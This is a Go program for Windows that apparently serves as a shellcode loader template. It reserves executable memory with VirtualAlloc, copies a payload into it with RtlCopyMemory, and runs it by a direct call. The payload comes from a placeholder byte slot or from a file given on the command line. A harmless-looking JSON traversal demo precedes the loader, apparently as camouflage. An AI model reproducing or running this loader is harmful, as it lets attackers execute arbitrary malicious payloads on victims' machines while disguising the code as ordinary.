package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
	"encoding/json"
	"fmt"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	ntdll          = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
	shellcode_calc = []byte{SHELLYTIME}
)

func checkErr(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}
const jsonString = `
	[
		{
			"type": "group",
			"value": [
				"Lorem",
				"Ipsum",
				"dolor",
				"sit",
				["A", "m", "e", "t"]
			]
		},
		{
			"type": "value",
			"value": "Hello World"
		},
		{
			"type": "value",
			"value": "foobar"
		}
	]
`

func jsonforeach(in *interface{}, handler func(*string, *int, *interface{}, int)) {
	eachJsonValue(in, handler, 0)
}

func eachJsonValue(node *interface{}, handler func(*string, *int, *interface{}, int), depth int) {
	if node == nil {
		return
	}
	o, isObject := (*node).(map[string]interface{})
	if isObject {
		for k, v := range o {
			handler(&k, nil, &v, depth)
			eachJsonValue(&v, handler, depth+1)
		}
	}
	a, isArray := (*node).([]interface{})
	if isArray {
		for i, x := range a {
			handler(nil, &i, &x, depth)
			eachJsonValue(&x, handler, depth+1)
		}
	}
}

func main() {

var j interface{}
	err := json.Unmarshal([]byte(jsonString), &j)
	if err == nil {
		jsonforeach(&j, func(key *string, index *int, value *interface{}, depth int) {
			for i := 0; i < depth; i++ {
				fmt.Print("  ")
			}
			v := *value
			switch v.(type) {
			case string:
				if key != nil {
					fmt.Printf("OBJECT: key=%q, value=%#v\n", *key, *value)
				} else {
					fmt.Printf("ARRAY: index=%d, value=%#v\n", *index, *value)
				}
			default:
				if key != nil {
					fmt.Printf("%v\n", *key)
				} else {
					fmt.Println("")
				}
			}
		})
	} else {
		fmt.Println(err)
	}
	shellcode := shellcode_calc
	if len(os.Args) > 1 {
		shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
		checkErr(err)
		shellcode = shellcodeFileData
	}

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}
